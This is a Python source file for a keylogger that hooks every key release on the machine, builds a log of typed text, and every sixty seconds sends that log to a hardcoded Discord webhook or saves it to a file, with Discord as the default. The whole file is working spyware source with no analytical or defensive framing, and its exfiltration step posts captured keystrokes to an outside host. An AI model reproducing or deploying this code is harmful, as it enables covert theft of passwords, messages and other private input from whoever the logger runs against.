import requests
import keyboard
from datetime import datetime
from threading import Timer

### CAPITAL LETTERS DETECTION MAY HAVE ERROR BECAUSE WILL FIGURE THAT WE START IN lowercase###

webHookURL = "https://discord.com/api/webhooks/10363****/8dh4bKBEwfYFWx2hn40yoSM***"
REPORT_METH = "discord"
REPORT_INTERVAL = 60 # SECONDS

class Keylogger:
    def __init__(self, interval, report_method):
        self.interval = interval
        self.report_method = report_method
        self.start_recording = datetime.now()
        self.end_recording = datetime.now()
        self.log = ""

    def callback(self, event):
        mayusEnabled = False
        name = event.name
        if len(name) > 1:
            if name == "enter":
                name = "[ENTER]\n"
            elif name == "space":
                name = " "
            elif name == "shift":
                name = "[SHIFT]"
            elif name == "caps lock":
                if mayusEnabled:
                    mayusEnabled = False
                else:
                    mayusEnabled = True
                name = "[MAYUS]"
        else:
            name = name.replace(" ", "_")
            if mayusEnabled:
                name = f"{name.upper()}"
            else:
                name = f"{name}"
        self.log += name

    def start(self):
        self.start_recording = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        print(f"{datetime.now()} - Started keylogger")
        keyboard.wait()

    def create_filename(self):
        start_recording_str = str(self.start_recording)[:-7].replace(" ", "-").replace(":", "")
        end_recording_str = str(self.end_recording)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_recording_str}_{end_recording_str}"

    def report_to_file(self):
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        print(f"Saved {self.filename}.txt")

    def report_to_discord(self):
        data = {"content": self.log}
        response = requests.post(webHookURL, json=data)
        print(response.status_code)
        print(response.content)

    def report(self):
        if self.log:
            self.end_recording = datetime.now()
            self.create_filename()
            if self.report_method == "file":
                self.report_to_file()
            elif self.report_method == "discord":
                self.report_to_discord()
            print(f"[{self.filename}] - {self.log}")
            self.start_recording = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

if __name__ == "__main__":
    keylogger = Keylogger(interval=REPORT_INTERVAL, report_method=REPORT_METH)
    keylogger.start()